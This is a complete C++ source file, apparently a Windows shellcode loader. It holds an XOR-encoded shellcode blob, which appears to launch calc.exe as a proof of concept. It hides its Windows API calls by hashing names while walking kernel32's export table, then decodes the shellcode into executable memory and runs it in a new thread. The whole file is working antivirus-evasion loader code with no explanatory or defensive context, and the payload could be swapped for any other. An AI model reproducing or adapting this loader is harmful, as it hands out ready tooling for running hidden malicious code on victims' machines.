/*
    Release, x86
*/
#include <windows.h>
#include <iostream>
#include <libloaderapi.h>


/* ======================== = shellcode ========================== */
unsigned char xorEncShellcode[] =
"\xfa\xf9\xfb\xf8\xfc\xfd\xff\x23\x4f\x29\x46\xb2\x9b\x5c\xfc\xc2"
"\xd2\xcf\xc9\xaa\xc2\xfd\xc3\xc4\xef\x23\xcf\x56\x9b\x5c\xce\x21"
"\xf4\x9a\x21\xf1\xa6\x21\xf1\xbe\x21\xb1\x21\xb1\x21\xf1\xba\x23"
"\xf7\x52\x21\xe9\x96\xab\x72\x21\xea\xd2\xab\x72\x21\xe2\x8e\xab"
"\x73\x23\xe7\x5e\x21\xd2\x8a\xab\x75\x23\xd7\x5a\x21\xfa\xb6\xab"
"\x70\x23\xff\x46\x21\xfa\xbe\x9b\x6a\x21\xd7\x5a\x21\xdf\x56\x9b"
"\x63\x56\x21\x96\x2d\xab\x75\xcc\x29\x6b\xa2\x59\x0c\xde\xa0\xea"
"\x93\x7a\xd8\x4f\x29\x6e\x8c\x41\x96\x21\xe7\x5e\x21\xff\x46\xcc"
"\x21\xae\xeb\x21\xae\x28\xab\x72\x9b\x78\xf8\xc2\x84\xcf\xd2\xcf"
"\xc2\xc9\xcb\xc6\xc9\xc2\xc7\x99\x98\xf6\xc2\xd3\xd9\xde\xcf\xc2"
"\xdd\xd9\xf6\xf9\xc2\xc3\xc4\xce\xc5\xc2\xe9\x90\xf6\xfd\x23\x4c"
"\xc0\xa0\xfc\x55\x7a\x29\x6e\xec\xf7\xf5\xf4\xf0\xf3\xf1\xf2\x69";

/* ======================== = shellcode ========================== */

unsigned char key[] = "\xAA";

typedef PVOID(WINAPI* pfunc1)(PVOID, SIZE_T, DWORD, DWORD);                                                  // pVirtualAlloc
typedef PVOID(WINAPI* pfunc2)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);    // pCreateThread
typedef PVOID(WINAPI* pfunc3)(HANDLE, DWORD);                                                                // pWaitForSingleObject
typedef PVOID(WINAPI* pRtlMoveMemory)(void*, void*, SIZE_T);                                                 // pRtlMoveMemory

unsigned int hash(const char* str)
{
    unsigned int hash = 7759;
    int c;

    while (c = *str++)
        hash = ((hash << 5) + hash) + c;

    return hash;
}

int main()
{
    HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
    pRtlMoveMemory funcRtlMoveMemory = (pRtlMoveMemory)GetProcAddress(hNtdll, "RtlMoveMemory");

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");

    pfunc1 func1 = nullptr;
    pfunc2 func2 = nullptr;
    pfunc3 func3 = nullptr;

    /* parse  "Kernel32.dll" header*/
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hKernel32;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hKernel32 + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)hKernel32 + pExportDirectory->AddressOfNameOrdinals);

    // parse "Kernel32.dll" export directory
    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
    {
        PCSTR pFunctionName = (PSTR)((PBYTE)hKernel32 + pAddressOfNames[i]);
        if (hash(pFunctionName) == 0x80fa57e1)
        {
            func1 = (pfunc1)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0xc7d73c9b)
        {
            func2 = (pfunc2)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        if (hash(pFunctionName) == 0x50c272c4)
        {
            func3 = (pfunc3)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }

    LPVOID addressPointer = func1(NULL, sizeof(xorEncShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (addressPointer == NULL)
    {
        std::cerr << "VirtualAlloc failed." << std::endl;
        return 1;
    }

    // Decrypt the shellcode
    for (size_t i = 0; i < sizeof(xorEncShellcode) - 1; i++) {
        xorEncShellcode[i] ^= key[0];
    }

    funcRtlMoveMemory(addressPointer, xorEncShellcode, sizeof(xorEncShellcode));
    HANDLE hThread = func2(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, NULL);
    func3(hThread, INFINITE);

    return EXIT_SUCCESS;
}